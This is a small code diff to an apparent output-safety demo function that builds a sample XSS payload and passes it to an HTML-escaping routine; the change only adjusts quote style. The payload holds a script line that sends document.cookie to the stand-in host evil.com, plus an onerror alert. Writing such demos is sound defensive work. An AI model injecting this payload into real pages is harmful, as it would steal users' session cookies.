@@ -38,7 +38,7 @@ def run_output_safety_demo() -> dict[str, Any]:
     xss_payload = (
         "<script>fetch('https://evil.com/steal?cookie=' + "
         "document.cookie);</script>"
-        '<img src=x onerror="alert(\'XSS Compromise!\')">'
+        "<img src=x onerror=\"alert('XSS Compromise!')\">"
     )
 
     escaped_text = escape_html_output(xss_payload)
